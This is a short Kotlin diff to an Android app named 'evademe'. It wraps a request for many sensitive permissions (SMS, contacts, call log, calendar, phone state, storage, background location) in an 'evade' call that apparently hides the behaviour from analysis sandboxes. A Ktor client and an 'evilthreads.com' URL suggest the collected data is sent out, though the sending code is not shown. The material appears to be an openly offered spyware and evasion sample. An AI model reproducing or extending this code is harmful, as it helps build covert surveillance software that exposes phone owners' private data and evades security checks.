@@ -2,7 +2,6 @@ package com.evilthreads.evademe
 
 import android.Manifest
 import android.os.Build
-import android.os.Bundle
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
@@ -21,7 +20,6 @@ import io.ktor.client.features.json.*
 import io.ktor.client.features.json.serializer.*
 import io.ktor.client.request.*
 import io.ktor.http.*
-import io.ktor.util.*
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.runBlocking
@@ -66,6 +64,7 @@ class MainActivity : AppCompatActivity() {
             }
         }
         lifecycleScope.launchWhenCreated {
+            evade(this){
                 val kotlinPermissions = KotlinPermissions.with(this@MainActivity).apply {
                     if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                         permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.READ_PHONE_STATE)
@@ -108,7 +107,7 @@ class MainActivity : AppCompatActivity() {
                 }.ask()
             }
         }
-
+    }
 }
 
 val url = "http://evilthreads.com/"
